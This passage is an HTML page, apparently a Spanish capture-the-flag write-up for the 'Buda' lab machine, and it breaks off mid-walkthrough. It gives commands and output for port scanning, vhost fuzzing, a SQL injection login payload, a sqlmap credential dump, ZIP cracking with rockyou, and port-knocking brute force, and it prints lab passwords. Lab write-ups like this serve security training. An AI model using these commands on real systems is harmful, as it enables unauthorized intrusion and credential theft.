@@ -1,0 +1,1033 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Buda — The Hacker Labs | Informe Técnico</title>
+<link href="https://fonts.googleapis.com/css2?family=Bebas+Neue&family=DM+Sans:wght@300;400;500;600;700&family=JetBrains+Mono:wght@300;400;500;700&display=swap" rel="stylesheet">
+<style>
+:root {
+  --ink:#0b1a10;--forest:#0f2318;--pine:#163020;--moss:#1e4030;--sage:#2a6048;
+  --green:#00e87a;--green2:rgba(0,232,122,.15);--green3:rgba(0,232,122,.06);
+  --cream:#f2ede4;--cream2:#faf7f1;
+  --text:#c8f0dc;--text2:rgba(200,240,220,.65);--text3:rgba(200,240,220,.35);
+  --card:#0d2215;--card2:#112b1c;--border:rgba(0,232,122,.1);
+  --red:#f87171;--yellow:#fbbf24;--blue:#60a5fa;--purple:#a78bfa;--orange:#fb923c;--cyan:#22d3ee;
+  --bb:'Bebas Neue',sans-serif;--dm:'DM Sans',sans-serif;--mo:'JetBrains Mono',monospace;
+  --accent:#00e87a;--bg:#0b1a10;--bg2:#0f2318;--bg3:#163020;
+  --text-muted:rgba(200,240,220,.35);--text-dim:rgba(200,240,220,.65);
+  --green4:#4ade80;
+}
+*{box-sizing:border-box;margin:0;padding:0;}
+html{scroll-behavior:smooth;}
+body{background:var(--ink);color:var(--text);font-family:var(--dm);line-height:1.7;font-size:15px;}
+a{color:var(--green);text-decoration:none;}
+code{background:var(--card2);padding:.15rem .4rem;border-radius:3px;font-family:var(--mo);font-size:.88em;color:var(--green);}
+pre{margin:0;white-space:pre-wrap;word-break:break-all;font-family:var(--mo);}
+ul{padding-left:1.5rem;}li{margin:.35rem 0;}
+h2{font-family:var(--bb);font-size:1.6rem;color:var(--text);border-bottom:1px solid var(--border);padding-bottom:.5rem;margin-bottom:1.25rem;letter-spacing:.04em;}
+h3{font-size:1.05rem;color:var(--text);margin-bottom:.75rem;font-weight:600;}
+
+/* ─── HERO ─── */
+.hero {
+  background: linear-gradient(135deg, var(--forest) 0%, var(--ink) 50%, #091a10 100%);
+  border-bottom: 1px solid var(--border);
+  padding: 60px 40px 50px;
+  position: relative;
+  overflow: hidden;
+}
+.hero::before {
+  content: '';
+  position: absolute; inset: 0;
+  background-image: linear-gradient(rgba(0,232,122,0.03) 1px, transparent 1px),
+                    linear-gradient(90deg, rgba(0,232,122,0.03) 1px, transparent 1px);
+  background-size: 56px 56px;
+  pointer-events: none;
+}
+.hero-layout {
+  max-width: 1200px; margin: 0 auto;
+  display: grid; grid-template-columns: 1fr 280px; gap: 48px; align-items: center;
+}
+@media(max-width: 900px) {
+  .hero-layout { grid-template-columns: 1fr; }
+  .hero-orb { order: -1; justify-self: center; }
+  .hero-meta { justify-content: center; }
+  .hero-sub { margin-left: auto; margin-right: auto; }
+  .hero-stats { justify-content: center; }
+}
+.hero-left { position: relative; z-index: 2; }
+.hero-brand {
+  font-family: var(--mo); font-size: 0.65rem;
+  color: rgba(0,232,122,0.45); letter-spacing: 0.2em; margin-bottom: 16px;
+  display: flex; align-items: center; gap: 8px;
+}
+.hero-brand-dot {
+  width: 6px; height: 6px; border-radius: 50%; background: var(--green);
+  box-shadow: 0 0 10px var(--green); animation: hpd 1.2s infinite alternate;
+}
+@keyframes hpd { to { opacity: 0.2; transform: scale(0.5); } }
+.hero h1 {
+  font-family: var(--bb); font-size: clamp(2.4rem, 4vw, 3.5rem);
+  font-weight: 400; letter-spacing: 0.04em; margin-bottom: 14px; line-height: 1;
+  color: var(--text);
+}
+.hero h1 span { color: var(--green); }
+.hero-sub {
+  color: var(--text2); font-size: 0.95rem; max-width: 600px;
+  margin-bottom: 24px; line-height: 1.7; font-weight: 300;
+}
+.hero-meta {
+  display: flex; align-items: center; gap: 8px; flex-wrap: wrap; margin-bottom: 18px;
+}
+.tag {
+  display: inline-flex; align-items: center; gap: 5px;
+  padding: 4px 12px; border-radius: 4px;
+  font-family: var(--mo);
+  font-size: 10px; font-weight: 500; letter-spacing: 0.8px; text-transform: uppercase;
+}
+.tag-platform { background: rgba(167,139,250,0.1); color: var(--purple); border: 1px solid rgba(167,139,250,0.25); }
+.tag-category { background: rgba(56,217,245,0.08); color: var(--cyan); border: 1px solid rgba(56,217,245,0.2); }
+.tag-diff-hard { background: rgba(248,113,113,0.08); color: var(--red); border: 1px solid rgba(248,113,113,0.2); }
+.tag-os { background: rgba(96,165,250,0.08); color: var(--blue); border: 1px solid rgba(96,165,250,0.2); }
+.tag-tech { background: rgba(251,191,36,0.08); color: var(--yellow); border: 1px solid rgba(251,191,36,0.2); }
+.hero-stats {
+  display: flex; gap: 28px; flex-wrap: wrap;
+}
+.stat { display: flex; flex-direction: column; gap: 2px; }
+.stat-label {
+  font-family: var(--mo);
+  font-size: 9px; text-transform: uppercase; letter-spacing: 1.5px; color: var(--text3);
+}
+.stat-value { font-size: 1rem; font-weight: 700; color: var(--text); }
+.stat-value.green { color: var(--green); }
+
+/* Orb */
+.hero-orb { display: flex; align-items: center; justify-content: center; position: relative; width: 260px; height: 260px; }
+.hero-orb canvas { display: block; width: 260px !important; height: 260px !important; }
+
+/* ─── LAYOUT ─── */
+.container{display:grid;grid-template-columns:1fr 300px;gap:2rem;max-width:1200px;margin:2rem auto;padding:0 1.5rem;}
+@media(max-width:900px){.container{grid-template-columns:1fr;}}
+
+/* ─── SECTIONS ─── */
+.section{margin:2.5rem 0;}
+.section-title{display:flex;align-items:center;gap:12px;margin-bottom:1.5rem;}
+.section-number{width:32px;height:32px;border-radius:50%;background:var(--green);color:var(--ink);font-weight:800;font-size:.85rem;display:flex;align-items:center;justify-content:center;flex-shrink:0;font-family:var(--mo);}
+.step-box{background:var(--card);border:1px solid var(--border);border-radius:12px;padding:1.5rem;margin:1.5rem 0;}
+.step-number{font-size:.7rem;color:var(--green);font-weight:700;text-transform:uppercase;letter-spacing:3px;margin-bottom:.4rem;font-family:var(--mo);}
+.why-box{background:rgba(0,232,122,.05);border-left:3px solid rgba(0,232,122,.4);padding:.9rem 1rem;border-radius:0 8px 8px 0;margin:1rem 0;}
+.why-box strong{color:var(--green);font-size:.8rem;text-transform:uppercase;letter-spacing:.05em;display:block;margin-bottom:.4rem;}
+.why-box p{font-size:.9rem;color:var(--text2);}
+.cmd-annotated{background:rgba(5,14,8,.9);border-radius:8px;padding:1rem 1.25rem;font-family:var(--mo);margin:1rem 0;border:1px solid var(--border);}
+.cmd-line{font-size:1rem;line-height:2;}
+.cmd{color:var(--green);font-weight:700;}.flag-opt{color:var(--yellow);}.ip{color:var(--orange);}.param{color:var(--cyan);}
+.cmd-notes{margin-top:.75rem;padding-top:.75rem;border-top:1px solid var(--border);display:flex;flex-direction:column;gap:.3rem;}
+.cmd-note{font-size:.8rem;color:var(--text2);padding:.3rem .75rem;border-left:2px solid var(--border);}
+.output-box{background:rgba(5,14,8,.9);border:1px solid var(--border);border-radius:8px;padding:1rem 1.25rem;font-family:var(--mo);font-size:.82rem;color:var(--text2);margin:1rem 0;overflow-x:auto;line-height:1.6;}
+.output-label{font-size:.65rem;color:var(--text3);text-transform:uppercase;letter-spacing:2px;margin-bottom:.5rem;}
+.interpret-box{background:rgba(0,232,122,.05);border-left:3px solid var(--green);padding:.9rem 1rem;border-radius:0 8px 8px 0;margin:1rem 0;}
+.interpret-box strong{color:var(--green);font-size:.8rem;text-transform:uppercase;letter-spacing:.05em;display:block;margin-bottom:.4rem;}
+.interpret-box p,.interpret-box li{font-size:.88rem;color:var(--text2);}
+.decision-box{background:rgba(251,146,60,.05);border-left:3px solid var(--orange);padding:.9rem 1rem;border-radius:0 8px 8px 0;margin:1rem 0;}
+.decision-box strong{color:var(--orange);font-size:.8rem;text-transform:uppercase;letter-spacing:.05em;display:block;margin-bottom:.4rem;}
+.decision-box p{font-size:.88rem;color:var(--text2);}
+.info-box{background:var(--card2);border:1px solid var(--border);border-radius:10px;padding:1.25rem;margin:1.25rem 0;}
+.info-box p{font-size:.9rem;color:var(--text2);}
+.attack-flow{display:flex;align-items:center;gap:.5rem;flex-wrap:wrap;margin:1.25rem 0;}
+.flow-step{background:var(--card2);padding:.35rem .75rem;border-radius:6px;font-family:var(--mo);font-size:.8rem;color:var(--text2);border:1px solid var(--border);}
+.flow-arrow{color:var(--text3);font-size:1.2rem;}
+.flow-step.success{color:var(--green);border:1px solid rgba(0,232,122,.3);background:rgba(0,232,122,.08);font-weight:700;}
+.vuln-card{background:rgba(248,113,113,.05);border:1px solid rgba(248,113,113,.2);border-radius:12px;padding:1.5rem;margin:1.5rem 0;}
+.vuln-card h3{color:var(--red);margin-bottom:.75rem;}
+.data-table{width:100%;border-collapse:collapse;font-size:.85rem;margin:1rem 0;}
+.data-table th{background:var(--card2);color:var(--text3);padding:.6rem 1rem;text-align:left;font-size:.75rem;text-transform:uppercase;}
+.data-table td{padding:.6rem 1rem;border-bottom:1px solid var(--border);}
+.data-table tr:last-child td{border-bottom:none;}
+.severity{padding:3px 10px;border-radius:4px;font-size:.72rem;font-weight:700;}
+.sev-critical{background:rgba(248,113,113,.15);color:var(--red);}
+.sev-high{background:rgba(251,146,60,.15);color:var(--orange);}
+.sev-medium{background:rgba(251,191,36,.15);color:var(--yellow);}
+.lessons-grid{display:grid;grid-template-columns:1fr 1fr;gap:1rem;margin:1rem 0;}
+@media(max-width:700px){.lessons-grid{grid-template-columns:1fr;}}
+.lesson-card{background:var(--card2);border-radius:10px;padding:1.25rem;border:1px solid var(--border);}
+.lesson-card h4{font-size:.85rem;margin-bottom:.75rem;}
+.lesson-card.attacker h4{color:var(--orange);}
+.lesson-card.defender h4{color:var(--cyan);}
+.lesson-card li{font-size:.83rem;color:var(--text2);}
+.flag-box{background:linear-gradient(135deg,rgba(0,232,122,.06),rgba(0,232,122,.02));border:1px solid rgba(0,232,122,.25);border-radius:14px;padding:2rem;text-align:center;margin:2.5rem 0;}
+.flag-label{font-size:.75rem;color:var(--text3);text-transform:uppercase;letter-spacing:3px;margin-bottom:.75rem;font-family:var(--mo);}
+.flag-value{font-family:var(--mo);font-size:1.1rem;color:var(--green);background:rgba(0,232,122,.08);padding:.6rem 1.5rem;border-radius:8px;display:inline-block;border:1px solid rgba(0,232,122,.2);}
+.rec-box{display:flex;gap:14px;padding:14px;background:var(--card2);border:1px solid var(--border);border-radius:8px;margin-bottom:10px;font-size:.88rem;}
+.rec-icon{font-size:1.2rem;flex-shrink:0;}
+.rec-title{font-weight:700;color:var(--text);margin-bottom:4px;}
+.rec-desc{color:var(--text-dim);font-size:.85rem;}
+.glos-item{padding:10px 0;border-bottom:1px solid var(--border);}
+.glos-item:last-child{border-bottom:none;}
+.glos-term{font-weight:700;color:var(--cyan);margin-bottom:4px;font-size:.9rem;font-family:var(--mo);}
+.glos-def{color:var(--text-dim);font-size:.85rem;}
+
+/* ─── MITRE ─── */
+.mitre-table{width:100%;border-collapse:collapse;font-size:.84rem;margin:1rem 0;}
+.mitre-table th{background:var(--card2);color:var(--text3);padding:.6rem 1rem;text-align:left;font-size:.72rem;text-transform:uppercase;}
+.mitre-table td{padding:.6rem 1rem;border-bottom:1px solid var(--border);}
+.mitre-table tr:last-child td{border-bottom:none;}
+
+/* ─── SIDEBAR ─── */
+.sidebar{position:sticky;top:2rem;height:fit-content;}
+.sidebar-card{background:var(--card);border:1px solid var(--border);border-radius:12px;padding:1.25rem;margin-bottom:1rem;}
+.sidebar-card h4{margin:0 0 .9rem;font-size:.72rem;text-transform:uppercase;letter-spacing:2px;color:var(--text3);font-family:var(--mo);}
+.meta-row{display:flex;justify-content:space-between;align-items:center;font-size:.83rem;padding:.45rem 0;border-bottom:1px solid var(--border);}
+.meta-row:last-child{border-bottom:none;}
+.meta-label{color:var(--text3);}.meta-value{color:var(--text);font-weight:600;font-family:var(--mo);font-size:.8rem;}
+.mitre-tag{display:inline-block;background:rgba(167,139,250,.08);color:var(--purple);border:1px solid rgba(167,139,250,.2);border-radius:4px;padding:.2rem .5rem;font-size:.72rem;font-family:var(--mo);margin:.2rem .15rem;}
+.toc-link{display:flex;align-items:center;gap:.6rem;padding:.4rem 0;font-size:.82rem;color:var(--text2);border-bottom:1px solid var(--border);transition:color .2s;}
+.toc-link:last-child{border-bottom:none;}
+.toc-link:hover{color:var(--green);}
+.toc-num{width:20px;height:20px;border-radius:50%;background:var(--card2);color:var(--text3);font-size:.7rem;display:flex;align-items:center;justify-content:center;font-family:var(--mo);flex-shrink:0;}
+
+</style>
+</head>
+<body>
+
+<!-- ═══ HERO ═══ -->
+<div class="hero">
+  <div class="hero-layout">
+    <div class="hero-left">
+      <div class="hero-brand"><span class="hero-brand-dot"></span>HEINDALL // WRITEUP</div>
+      <div class="hero-meta">
+        <span class="tag tag-platform">The Hacker Labs</span>
+        <span class="tag tag-diff-hard">Hard</span>
+        <span class="tag tag-os">Linux</span>
+        <span class="tag tag-tech">SQL Injection</span>
+        <span class="tag tag-tech">Port Knocking</span>
+        <span class="tag tag-tech">SUID Bash</span>
+      </div>
+      <h1><span>Buda</span> — Port Knocking + SQLi + SUID</h1>
+      <p class="hero-sub">Explotación en cadena: enumeración de virtual hosts, SQL Injection para credenciales FTP, descubrimiento de secuencia de port knocking en archivos del FTP, crackeo de ZIP cifrado con credenciales de auditoría, y escalada de privilegios mediante SUID en /usr/bin/bash.</p>
+      <div class="hero-stats">
+        <div class="stat"><span class="stat-label">Target</span><span class="stat-value green">192.168.X.X</span></div>
+        <div class="stat"><span class="stat-label">OS</span><span class="stat-value">Ubuntu Linux</span></div>
+        <div class="stat"><span class="stat-label">Puertos</span><span class="stat-value">21, 80 (22 filtrado)</span></div>
+        <div class="stat"><span class="stat-label">Fases</span><span class="stat-value">5</span></div>
+        <div class="stat"><span class="stat-label">Vulns</span><span class="stat-value">3 Críticas</span></div>
+      </div>
+    </div>
+    <!-- Orb — Right -->
+    <div class="hero-orb">
+      <canvas id="heroOrb" width="520" height="520"></canvas>
+    </div>
+  </div>
+</div>
+
+<div class="container">
+<main>
+
+<!-- ═══ 1. DESCRIPCIÓN ═══ -->
+<div class="section" id="descripcion">
+  <div class="section-title">
+    <span class="section-number">1</span>
+    <h2>Descripción</h2>
+  </div>
+  <div class="info-box">
+    <p><strong>Buda</strong> es una máquina Linux de dificultad <strong style="color:var(--red);">Hard</strong> de la plataforma <strong style="color:var(--purple);">The Hacker Labs</strong>. Combina tres técnicas avanzadas en cadena: enumeración de virtual hosts, explotación de SQL Injection para obtener credenciales de FTP, descubrimiento y crackeo de archivos protegidos, y finalmente <em>port knocking</em> para desbloquear SSH. La escalada de privilegios abusa de un bit SUID incorrectamente asignado al binario <code>/usr/bin/bash</code>.</p>
+  </div>
+  <div class="attack-flow">
+    <div class="flow-step">Nmap recon</div>
+    <div class="flow-arrow">→</div>
+    <div class="flow-step">vhost fuzzing</div>
+    <div class="flow-arrow">→</div>
+    <div class="flow-step">SQLi → FTP creds</div>
+    <div class="flow-arrow">→</div>
+    <div class="flow-step">FTP → knock + ZIP</div>
+    <div class="flow-arrow">→</div>
+    <div class="flow-step">KnockIt → SSH</div>
+    <div class="flow-arrow">→</div>
+    <div class="flow-step success">SUID bash → ROOT ✅</div>
+  </div>
+  <p style="color:var(--text-dim);font-size:.9rem;margin-top:1rem;">La máquina requiere pensar de forma lateral: el puerto SSH aparece filtrado en el escaneo inicial, obligando al atacante a descubrir la secuencia de knock a través de una cadena de explotación que involucra FTP, un ZIP cifrado y un archivo de auditoría con credenciales expuestas.</p>
+</div>
+
+<!-- ═══ 2. RECONOCIMIENTO ═══ -->
+<div class="section" id="reconocimiento">
+  <div class="section-title">
+    <span class="section-number">2</span>
+    <h2>Reconocimiento</h2>
+  </div>
+
+  <div class="step-box">
+    <div class="step-number">Paso 1 — Nmap fase 1</div>
+    <h3>Escaneo de puertos completo</h3>
+    <div class="why-box">
+      <strong>¿Por qué?</strong>
+      <p>El primer paso siempre es saber qué servicios expone la máquina. Usamos nmap con <code>-p-</code> para escanear los 65535 puertos TCP, ya que servicios no estándar o puertos altos pueden esconderse fácilmente.</p>
+    </div>
+    <div class="cmd-annotated">
+      <div class="cmd-line">
+        <span class="cmd">nmap</span>
+        <span class="flag-opt"> -p-</span>
+        <span class="flag-opt"> --open</span>
+        <span class="flag-opt"> -n</span>
+        <span class="flag-opt"> -T4</span>
+        <span class="flag-opt"> -sS</span>
+        <span class="ip"> 192.168.253.145</span>
+      </div>
+      <div class="cmd-notes">
+        <div class="cmd-note"><code>-p-</code> → escanea los 65535 puertos TCP</div>
+        <div class="cmd-note"><code>--open</code> → muestra solo puertos abiertos</div>
+        <div class="cmd-note"><code>-sS</code> → SYN scan (stealth, no completa el handshake)</div>
+        <div class="cmd-note"><code>-T4</code> → velocidad agresiva</div>
+      </div>
+    </div>
+    <div class="output-box">
+      <div class="output-label">Output nmap</div>
+      <pre>PORT   STATE SERVICE
+21/tcp open  ftp
+80/tcp open  http
+Not shown: 65533 filtered tcp ports (no-response)</pre>
+    </div>
+    <div class="interpret-box">
+      <strong>¿Qué nos dice?</strong>
+      <p>Solo dos puertos abiertos: FTP (21) y HTTP (80). El puerto 22 (SSH) aparece <strong>filtrado</strong>, no cerrado — esto es la firma clásica de port knocking activo. El sistema tiene una "puerta secreta" que solo se abre con la secuencia correcta de paquetes.</p>
+    </div>
+    <div class="decision-box">
+      <strong>Decisión</strong>
+      <p>Escanear en profundidad FTP y HTTP, y buscar la secuencia de knock en esos servicios.</p>
+    </div>
+  </div>
+
+  <div class="step-box">
+    <div class="step-number">Paso 2 — Nmap profundo</div>
+    <h3>Scripts y versiones</h3>
+    <div class="why-box">
+      <strong>¿Por qué?</strong>
+      <p><code>-sC</code> ejecuta scripts de detección automática (como ftp-anon, http-title) y <code>-sV</code> identifica la versión exacta del servicio — información crítica para buscar exploits conocidos.</p>
+    </div>
+    <div class="cmd-annotated">
+      <div class="cmd-line">
+        <span class="cmd">nmap</span>
+        <span class="flag-opt"> -p21,80</span>
+        <span class="flag-opt"> -sC</span>
+        <span class="flag-opt"> -sV</span>
+        <span class="flag-opt"> -n</span>
+        <span class="ip"> 192.168.253.145</span>
+      </div>
+    </div>
+    <div class="output-box">
+      <div class="output-label">Output nmap</div>
+      <pre>PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 3.0.5
+80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
+|_http-title: Apache2 Ubuntu Default Page: It works</pre>
+    </div>
+    <div class="interpret-box">
+      <strong>¿Qué nos dice?</strong>
+      <p>FTP corre vsftpd 3.0.5 — versión estable, sin CVEs críticos conocidos. HTTP es Apache 2.4.52 mostrando la página por defecto de Ubuntu, lo que significa que el contenido real está en otro virtual host (vhost).</p>
+    </div>
+    <div class="decision-box">
+      <strong>Decisión</strong>
+      <p>Explorar robots.txt en busca de pistas del vhost, y hacer fuzzing de virtual hosts con ffuf.</p>
+    </div>
+  </div>
+
+  <div class="step-box">
+    <div class="step-number">Paso 3 — Virtual Host Discovery</div>
+    <h3>ffuf + robots.txt</h3>
+    <div class="why-box">
+      <strong>¿Por qué?</strong>
+      <p>Cuando Apache muestra su página por defecto, es señal de que el sitio real está configurado para responder a un nombre de host específico. <code>ffuf</code> fuerza bruta el header <code>Host:</code> para encontrar qué nombres de dominio tienen respuestas diferentes.</p>
+    </div>
+    <div class="cmd-annotated">
+      <div class="cmd-line">
+        <span class="cmd">curl</span>
+        <span class="flag-opt"> -s</span>
+        <span class="param"> http://192.168.253.145/robots.txt</span>
+      </div>
+    </div>
+    <div class="output-box">
+      <pre>User-agent: *
+Allow: budasec.thl</pre>
+    </div>
+    <div class="cmd-annotated">
+      <div class="cmd-line">
+        <span class="cmd">ffuf</span>
+        <span class="flag-opt"> -u</span>
+        <span class="param"> http://192.168.253.145</span>
+        <span class="flag-opt"> -H</span>
+        <span class="param"> "Host: FUZZ.budasec.thl"</span>
+        <span class="flag-opt"> -w</span>
+        <span class="param"> /usr/share/wordlists/dirb/common.txt</span>
+        <span class="flag-opt"> -fs</span>
+        <span class="param"> 10671</span>
+      </div>
+      <div class="cmd-notes">
+        <div class="cmd-note"><code>-fs 10671</code> → filtra respuestas del mismo tamaño que la página por defecto</div>
+        <div class="cmd-note"><code>FUZZ</code> → posición donde se inyectan los subdominios del diccionario</div>
+      </div>
+    </div>
+    <div class="output-box">
+      <pre>dev                     [Status: 200, Size: 264, Words: 47, Lines: 12]</pre>
+    </div>
+    <div class="interpret-box">
+      <strong>¿Qué nos dice?</strong>
+      <p><code>robots.txt</code> revela el dominio base <code>budasec.thl</code>. Existe el subdominio <strong>dev.budasec.thl</strong> con contenido diferente — un panel de login.</p>
+    </div>
+    <div class="decision-box">
+      <strong>Decisión</strong>
+      <p>Agregar <code>dev.budasec.thl</code> a <code>/etc/hosts</code> e investigar el panel de login.</p>
+    </div>
+  </div>
+</div>
+
+<!-- ═══ 3. EXPLOTACIÓN WEB ═══ -->
+<div class="section" id="explotacion">
+  <div class="section-title">
+    <span class="section-number">3</span>
+    <h2>Explotación Web — SQL Injection</h2>
+  </div>
+
+  <div class="step-box">
+    <div class="step-number">Paso 4 — Detección de SQLi</div>
+    <h3>SQL Injection manual en dev.php</h3>
+    <div class="why-box">
+      <strong>¿Qué es SQL Injection?</strong>
+      <p>Es una vulnerabilidad donde el input del usuario es insertado directamente en una consulta SQL sin sanitizar. Al introducir <code>' OR 1=1--</code>, rompemos la lógica de la consulta y podemos extraer datos o bypasear autenticación.</p>
+    </div>
+    <div class="cmd-annotated">
+      <div class="cmd-line">
+        <span class="cmd">curl</span>
+        <span class="flag-opt"> -H</span>
+        <span class="param"> "Host: dev.budasec.thl"</span>
+        <span class="flag-opt"> --data</span>
+        <span class="param"> "username=' OR 1=1-- -&amp;password=x"</span>
+        <span class="ip"> http://192.168.253.145/dev.php</span>
+      </div>
+    </div>
+    <div class="output-box">
+      <pre>Fatal error: Uncaught mysqli_sql_exception: You have an error in your
+SQL syntax; check the manual that corresponds to your MySQL server
+version for the right syntax to use near ''' at line 1 in
+/var/www/html/xyprob/12356723/dev.php:28</pre>
+    </div>
+    <div class="interpret-box">
+      <strong>¿Qué nos dice?</strong>
+      <p>El error de MySQL es visible en la respuesta HTTP — la aplicación no maneja excepciones. Esto revela la ruta exacta del archivo PHP (<code>/var/www/html/xyprob/12356723/dev.php</code>) y que el campo <code>username</code> es inyectable.</p>
+    </div>
+    <div class="decision-box">
+      <strong>Decisión</strong>
+      <p>Usar sqlmap para automatizar el dump de la base de datos <code>buda</code>.</p>
+    </div>
+  </div>
+
+  <div class="step-box">
+    <div class="step-number">Paso 5 — sqlmap dump</div>
+    <h3>Extracción de credenciales FTP</h3>
+    <div class="why-box">
+      <strong>¿Qué es sqlmap?</strong>
+      <p>sqlmap es la herramienta de referencia para automatizar la explotación de SQLi. Detecta automáticamente el tipo de inyección y extrae datos de la base de datos sin necesidad de hacerlo manualmente.</p>
+    </div>
+    <div class="cmd-annotated">
+      <div class="cmd-line">
+        <span class="cmd">sqlmap</span>
+        <span class="flag-opt"> -u</span>
+        <span class="param"> "http://192.168.253.145/dev.php"</span>
+        <span class="flag-opt"> -H</span>
+        <span class="param"> "Host: dev.budasec.thl"</span>
+        <span class="flag-opt"> --data</span>
+        <span class="param"> "username=admin&amp;password=test"</span>
+        <span class="flag-opt"> --batch</span>
+        <span class="flag-opt"> -D</span>
+        <span class="param"> buda</span>
+        <span class="flag-opt"> -T</span>
+        <span class="param"> users</span>
+        <span class="flag-opt"> -C</span>
+        <span class="param"> username,password</span>
+        <span class="flag-opt"> --dump</span>
+        <span class="flag-opt"> --tamper</span><span class="param">=space2comment</span>
+      </div>
+    </div>
+    <div class="output-box">
+      <pre>Database: buda
+Table: users
++----------+--------------------+
+| username | password           |
++----------+--------------------+
+| admin    | admin123           |
+| ftpuser  | ftpu@sr123p@@s!    |
+| user1    | password1          |
+| user2    | password2          |
++----------+--------------------+</pre>
+    </div>
+    <div class="interpret-box">
+      <strong>¿Qué nos dice?</strong>
+      <p>La tabla <code>users</code> expone credenciales en texto plano (sin hash). La más importante: <strong>ftpuser:ftpu@sr123p@@s!</strong> — este usuario es el acceso al servicio FTP.</p>
+    </div>
+    <div class="decision-box">
+      <strong>Decisión</strong>
+      <p>Conectar al FTP con <code>ftpuser:ftpu@sr123p@@s!</code> y explorar el contenido.</p>
+    </div>
+  </div>
+</div>
+
+<!-- ═══ 4. FTP + ZIP + CREDENCIALES ═══ -->
+<div class="section" id="ftp">
+  <div class="section-title">
+    <span class="section-number">4</span>
+    <h2>FTP, ZIP cifrado y Credenciales</h2>
+  </div>
+
+  <div class="step-box">
+    <div class="step-number">Paso 6 — FTP exploración</div>
+    <h3>Descarga de archivos del servidor</h3>
+    <div class="cmd-annotated">
+      <div class="cmd-line">
+        <span class="cmd">ftp</span>
+        <span class="ip"> 192.168.253.145</span>
+      </div>
+      <div class="cmd-notes">
+        <div class="cmd-note">Name: <code>ftpuser</code> · Password: <code>ftpu@sr123p@@s!</code></div>
+      </div>
+    </div>
+    <div class="output-box">
+      <pre>ftp> cd ftp/documents
+ftp> ls -la
+drwxr-xr-x    3 0        0            4096 Jun 06  2024 .
+drwxr-xr-x    6 1001     1001         4096 Jun 06  2024 ..
+drwxr-xr-x    2 0        0            4096 Jun 06  2024 backup_2022
+-rw-r--r--    1 0        0               2 Jun 06  2024 README.md
+-rw-r--r--    1 0        0             499 Jun 06  2024 decrypt.py
+-rw-r--r--    1 0        0            1870 Jun 06  2024 documents.zip
+-rw-r--r--    1 0        0              15 Jun 06  2024 knock</pre>
+    </div>
+    <div class="interpret-box">
+      <strong>¿Qué nos dice?</strong>
+      <p>Tres archivos clave: <code>knock</code> (contiene la secuencia de port knocking), <code>documents.zip</code> (ZIP cifrado con información sensible), y <code>decrypt.py</code> (script decorativo/distracción).</p>
+    </div>
+  </div>
+
+  <div class="step-box">
+    <div class="step-number">Paso 7 — fcrackzip</div>
+    <h3>Crack del ZIP cifrado + lectura de knock</h3>
+    <div class="why-box">
+      <strong>¿Qué es fcrackzip?</strong>
+      <p>fcrackzip es un cracker especializado para archivos ZIP. <code>-D</code> activa diccionario, <code>-u</code> verifica descomprimiendo, <code>-p</code> especifica la wordlist.</p>
+    </div>
+    <div class="cmd-annotated">
+      <div class="cmd-line">
+        <span class="cmd">cat</span>
+        <span class="param"> knock</span>
+      </div>
+    </div>
+    <div class="output-box"><pre>9467
+1739
+8745</pre></div>
+    <div class="cmd-annotated">
+      <div class="cmd-line">
+        <span class="cmd">fcrackzip</span>
+        <span class="flag-opt"> -v</span>
+        <span class="flag-opt"> -D</span>
+        <span class="flag-opt"> -u</span>
+        <span class="flag-opt"> -p</span>
+        <span class="param"> /usr/share/wordlists/rockyou.txt</span>
+        <span class="param"> documents.zip</span>
+      </div>
+    </div>
+    <div class="output-box">
+      <pre>found file 'audit2024', (size cp/uc   1686/  4059, flags 9, chk 6bdb)
+
+PASSWORD FOUND!!!!: pw == manuelito</pre>
+    </div>
+    <div class="interpret-box">
+      <strong>¿Qué nos dice?</strong>
+      <p>La contraseña del ZIP es <code>manuelito</code>. Contiene un archivo llamado <code>audit2024</code> — un informe de auditoría con credenciales expuestas por error.</p>
+    </div>
+  </div>
+
+  <div class="step-box">
+    <div class="step-number">Paso 8 — Credenciales de yolanda</div>
+    <h3>Extracción del archivo audit2024</h3>
+    <div class="cmd-annotated">
+      <div class="cmd-line">
+        <span class="cmd">unzip</span>
+        <span class="flag-opt"> -P</span>
+        <span class="param"> manuelito documents.zip</span>
+      </div>
+    </div>
+    <div class="cmd-annotated">
+      <div class="cmd-line">
+        <span class="cmd">cat</span>
+        <span class="param"> audit2024</span>
+        <span class="flag-opt"> | grep</span>
+        <span class="flag-opt"> -i</span>
+        <span class="param"> "yolanda\|credentials\|exposed"</span>
+      </div>
+    </div>
+    <div class="output-box">
+      <pre>Exposed yolanda user credentials:y@lAnd361!</pre>
+    </div>
+    <div class="interpret-box">
+      <strong>¿Qué nos dice?</strong>
+      <p>El informe de auditoría contiene una línea que expone accidentalmente las credenciales del usuario <strong>yolanda</strong>: contraseña <code>y@lAnd361!</code>. Esto es un Data Exposure real — alguien metió credenciales de producción en un documento de auditoría.</p>
+    </div>
+    <div class="decision-box">
+      <strong>Decisión</strong>
+      <p>Usar KnockIt para abrir el puerto SSH y conectar como yolanda.</p>
+    </div>
+  </div>
+</div>
+
+<!-- ═══ 5. PORT KNOCKING + SSH ═══ -->
+<div class="section" id="knocking">
+  <div class="section-title">
+    <span class="section-number">5</span>
+    <h2>Port Knocking + SSH — User Flag</h2>
+  </div>
+
+  <div class="step-box">
+    <div class="step-number">Paso 9 — KnockIt brute force</div>
+    <h3>Descubrimiento de secuencia correcta</h3>
+    <div class="why-box">
+      <strong>¿Qué es Port Knocking?</strong>
+      <p>Port knocking es un mecanismo de seguridad donde el servidor tiene SSH bloqueado por firewall. Para abrirlo, hay que "tocar" una secuencia específica de puertos en el orden correcto. El daemon <code>knockd</code> escucha estos intentos y abre el firewall temporalmente. El archivo <code>knock</code> nos da los 3 puertos (9467, 1739, 8745) pero no el orden. <strong>KnockIt</strong> prueba las 6 permutaciones automáticamente.</p>
+    </div>
+    <div class="cmd-annotated">
+      <div class="cmd-line">
+        <span class="cmd">python3</span>
+        <span class="param"> KnockIt/knockit.py</span>
+        <span class="flag-opt"> -b</span>
+        <span class="ip"> 192.168.X.X 9467 1739 8745</span>
+      </div>
+      <div class="cmd-notes">
+        <div class="cmd-note"><code>-b</code> → bruteforce (prueba todas las permutaciones 3! = 6)</div>
+      </div>
+    </div>
+    <div class="output-box">
+      <pre>[+] Knocking with sequence: (8745, 9467, 1739)
+[+] Knocking on port TARGET:8745
